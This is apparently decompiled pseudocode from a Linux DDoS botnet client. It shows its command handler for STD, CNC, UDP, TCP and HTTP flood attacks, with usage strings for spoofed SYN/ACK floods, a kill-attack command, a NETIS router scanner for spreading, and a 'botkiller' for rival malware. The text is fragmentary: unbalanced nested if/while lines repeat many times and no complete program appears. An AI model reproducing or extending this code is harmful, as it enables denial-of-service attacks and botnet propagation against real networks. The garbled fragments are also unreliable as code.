                                                                                                                                                                                                        kill(v319, 9);
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                            sendSTD(v301, v307, v308);
                                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                    result3 = sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendCNC(v292, v298, v299);
                                                                                                                                                                        __libc_close(v212);
                                                                                                                                                                                    v314 = listFork();
                                                                                                                                                                                        sendSTD(v306, v307, v308);
                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                    result3 = sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                                v314 = listFork();
                                                                                                                                                                                    sendSTD(v306, v307, v308);
                                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                result3 = sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                    while (true) {
                                                                                                                                                return sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                                while (true) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendHTTP(v223, v222, (int16_t)v322, v221, v220, atol(*(int32_t *)v251, v251));
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendCNC(v297, v298, v299);
                                                                                                                                                                                            v314 = listFork();
                                                                                                                                                                                                sendSTD(v306, v307, v308);
                                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                            sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                                        sendSTD(v306, v307, v308);
                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                    sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                    sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                            sendSTD(v306, v307, v308);
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                        sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendCNC(v297, v298, v299);
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                            sendSTD(v306, v307, v308);
                                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                                while (true) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                        sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                            while (true) {
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                    sendSTD(v306, v307, v308);
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v306, v307, v308);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendCNC(v297, v298, v299);
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                                        sendSTD(v306, v307, v308);
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendSTD(v306, v307, v308);
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                            sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendSTD(v306, v307, v308);
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                            sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendCNC(v297, v298, v299);
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                            sendSTD(v306, v307, v308);
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                        sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                    sendSTD(v306, v307, v308);
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v306, v307, v308);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendCNC(v297, v298, v299);
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                    sendSTD(v306, v307, v308);
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                            sendSTD(v306, v307, v308);
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                        sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                        sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendSTD(v306, v307, v308);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendCNC(v297, v298, v299);
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendSTD(v306, v307, v308);
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v306, v307, v308);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                    sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendSTD(v306, v307, v308);
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                        sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                            sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendCNC(v297, v298, v299);
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v306, v307, v308);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                                                while (true) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendSTD(v306, v307, v308);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                            sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendSTD(v306, v307, v308);
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                sockprintf(v212, (int32_t)"STD <target> <port> <time>", 0x10020000);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendCNC(v297, v298, v299);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                    sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendCNC(v297, v298, v299);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                                                sendUDP(v228, v254, v255, v256, v257, v225, v231);
                                                                                            if (listFork() == 0) {
                                                                                                sendUDP(v253, v254, v255, v256, v257, v225, v231);
                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                                sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                                                sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendCNC(v297, v298, v299);
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                        sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendCNC(v297, v298, v299);
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendCNC(v297, v298, v299);
                                                                                                                                                while (true) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                            sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                    sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                            if (listFork() == 0) {
                                                                                                                sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendCNC(v297, v298, v299);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                    sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendCNC(v297, v298, v299);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                            sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendCNC(v297, v298, v299);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                        sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                        sockprintf(v212, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10020000);
                                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                        sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                        sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                    if (listFork() == 0) {
                                                                                        sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendCNC(v297, v298, v299);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                            while (true) {
                                                                                                if (listFork() == 0) {
                                                                                                        if (listFork() == 0) {
                                                                                                            sendCNC(v297, v298, v299);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                        sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendCNC(v297, v298, v299);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                    sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                            sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                    if (listFork() == 0) {
                                                                        sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                            if (listFork() == 0) {
                                                                                                sendCNC(v297, v298, v299);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                            sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                                                    if (listFork() == 0) {
                                                                                        sendCNC(v297, v298, v299);
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                    sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                if (listFork() == 0) {
                                                                                    sendCNC(v297, v298, v299);
                                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                    if (listFork() == 0) {
                                        v281 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                                        v287 = sockprintf(v223, (int32_t)"COMMENCING BOT KILL ON -> %s", v281);
                                        botkiller(v287);
                                if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                                    v282 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                                    sockprintf(v223, (int32_t)"My Public IP: %s", v282);
                                    if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                                sockprintf(v212, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10020000);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v253, v254, v255, v256, v257, v225, v231);
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                        sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                                        sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendCNC(v297, v298, v299);
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                            sendCNC(v297, v298, v299);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                        sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendCNC(v297, v298, v299);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                    sockprintf(v212, (int32_t)"CNC <target> <port> <time>", 0x10020000);
                                                                                            sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v253, v254, v255, v256, v257, v225, v231);
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                                sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                    sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                        sockprintf(v212, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10020000);
                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                        sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                        sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                    if (listFork() == 0) {
                                                                        sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                            sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                    if (listFork() == 0) {
                                                        sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                        while (true) {
                                                            if (listFork() == 0) {
                if (__GI_strcoll((char *)*a2, (int32_t)"NETIS") == 0) {
                        kill(v278, 9);
                        v279 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                        sockprintf(v223, (int32_t)"STOPPING NETIS SCANNER", v279);
                            v232 = __libc_fork();
                                v280 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                                v286 = sockprintf(v223, (int32_t)"STARTING NETIS SCANNER", v280);
                                NetisScanner(v286);
                                    if (listFork() == 0) {
                                        v281 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                                        v287 = sockprintf(v223, (int32_t)"COMMENCING BOT KILL ON -> %s", v281);
                                        botkiller(v287);
                                if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                                    v282 = __GI_inet_ntoa(&v224, (int32_t)&v214);
                                    sockprintf(v223, (int32_t)"My Public IP: %s", v282);
                                    if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                                sockprintf(v212, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10020000);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v253, v254, v255, v256, v257, v225, v231);
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                        sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                                        sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                            sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v253, v254, v255, v256, v257, v225, v231);
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                                sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendTCP(v265, v266, v267, v268, v269, v229, v230);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                    sockprintf(v212, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10020000);
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendHTTP(v223, v222, (int16_t)(v274 % 0x10000), v221, v220, v277);
